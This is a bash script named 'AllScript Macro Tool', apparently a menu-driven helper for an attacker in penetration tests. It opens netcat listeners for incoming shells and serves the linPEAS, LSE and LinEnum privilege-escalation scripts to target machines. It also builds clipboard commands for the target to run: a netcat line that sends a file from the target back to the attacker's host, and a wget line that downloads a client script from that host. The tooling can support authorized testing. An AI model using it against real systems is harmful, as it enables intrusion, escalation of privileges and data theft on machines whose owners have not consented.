# Black        0;30     Dark Gray     1;30
# Red          0;31     Light Red     1;31
# Green        0;32     Light Green   1;32
# Brown/Orange 0;33     Yellow        1;33
# Blue         0;34     Light Blue    1;34
# Purple       0;35     Light Purple  1;35
# Cyan         0;36     Light Cyan    1;36
# Light Gray   0;37     White         1;37

RED='\033[1;31m'
BLUE='\033[0;34m'
WHITE='\033[1;37m'
GREEN='\033[1;32m'
PURP='\033[1;35m'
deps=('xsel' 'nc' 'python3')
currServerPath=""
GIP=""
echo -e "$BLUE
                                                                                                                   
       db         88           88                  888b      88                       88                           
      d88b        88           aa                  8888b     88                       88                           
     d8ss8b       88                               88 a8b    88                       88                           
    d8a  a8b      88 dPPYba    88  8b8dPPYba       88  a8b   88  aadPPYYbaa   aadPPYb,88  ,adPPYYbaa 18b       d8a 
   d8YaaaaY8b     88P      8a  88  88P'    Y8      88   a8b  88  aa     aY8  a8a    aY88  aa     1Y   8b      d8a  
  d8aaaaaaaa8b    88       d8  88  88              88    a8b 88  aadPPPPP88  8b       88  ,adPPPPP88   a8b   d8a   
 d8         a8b   88b     a8   88  88              88     a8888  88a    a88  a8aa   ad88  88a    a88    a8bad8a    
d8           a8b  8YaYbbd8aa   88  88              88      aa88  aa8bbdPaY8   aa8bbdP8Y8  aa8bbdPaY8      a8a      
                                                                                                                   
                                                                                                                   


$GREEN Welcome To AllScript Macro Tool by Abir Nadav $BLUE

Version ---> 1.1 
GitHub  ---> https://github.com/AbirNadav-dev/AllScript
_________________________________________________________________________________________________________________




"



echo -e "$WHITE"
echo -e "Testing if you have Tool Dependencies...
"


function checkDep (){
if ! command -v $1 &> /dev/null
then
    echo -e "$RED"
    echo -e "[WARNING] $1 could not be found $BLUE"
    echo -e "Trying to install $1 now.$WHITE
    "
    sudo apt-get install $1
else
    echo -e "$GREEN"
    echo -e "[FOUND] ----> $1"
fi
}


for item in ${deps[*]}
do
    checkDep $item
done


# Copy To ClipBoard Function

function copyToClip(){
    echo "$1" | xsel -ib
}

# Get Python HTTP.server Path

function getServerIP(){
   IP=$(hostname -I | awk '{print $1}')
    currServerPath="http://$IP:8000" 
}

# Get FileUpload Path

function getFileIP(){
   IP=$(hostname -I | awk '{print $1}')
    GIP="$IP" 
}





echo -e "$BLUE
_________________________________________________________________________________________________________________


$GREEN
"




pwd=$('pwd')
PS3='
Please enter your choice: '
options=("Start AllScript Server" "Open NetCat Listener" "Lin Peas Server" "LinSmartPE Server" "LinEnum Server" "Get File From Target" "Get Client Downloader CMD" "Quit")
select opt in "${options[@]}"
do
    case $opt in
        "Start AllScript Server")
            echo -e "$PURP"
            echo -e "AllScript Server Started."
            python3 -m http.server
            echo -e "$GREEN "
            ;;
        "Open NetCat Listener")
            echo -e "$PURP"
            echo -e "Starting NetCat Listener"
            echo -e "Insert Listen LPORT"
            read lport
            sudo nc -nlvp $lport 
             echo -e "$GREEN "
            ;;
        "Lin Peas Server")
            echo -e "$PURP"
            echo -e "you chose choice $REPLY which is $opt"
            getServerIP
            path="$currServerPath/linpeas.sh" 
            copyToClip "$path"
            python3 -m http.server --directory "$pwd/lib/linPEAS/"
            echo -e "$GREEN "
            ;;
        "LinSmartPE Server")
            echo -e "$PURP"
            echo -e "you chose choice $REPLY which is $opt"
            getServerIP
            path="$currServerPath/lse.sh" 
            copyToClip "$path"
            python3 -m http.server --directory "$pwd/lib/LSE/"
            echo -e "$GREEN "
            ;;  
        "LinEnum Server")
            echo -e "$PURP"
            echo -e "you chose choice $REPLY which is $opt"
            getServerIP
            path="$currServerPath/LinEnum.sh" 
            copyToClip "$path"
            python3 -m http.server --directory "$pwd/lib/linEnum/"
            echo -e "$GREEN "
            ;; 
        "Get File From Target")
            echo -e "$PURP"
            echo -e "you chose choice $REPLY which is $opt"
            echo -e "Choose Output Filename:"
            read -e outputFile
            getFileIP
            command="nc -w 3 $GIP 9886 < filename"
            copyToClip "$command"
            echo "Command Copied to Clipboard! Or use AllClient"
            nc -l -p 9886 > "$outputFile"
            echo -e "$RED"
            echo -e "File Saved as: $outputFile"
            echo -e "$GREEN "
            ;;
             "Get Client Downloader CMD")
            echo -e "$PURP"
            echo -e "you chose choice $REPLY which is $opt"
            getFileIP
            command="wget http://$GIP:8000/AllClient.sh "
            copyToClip "$command"
            python3 -m http.server
            echo -e "$GREEN "
            ;;  
        "
        Quit")
            echo "Good Bye, Im waiting at: $pwd"
            break
            ;;
        *) echo echo -e "$RED invalid option $REPLY";;
    esac
done

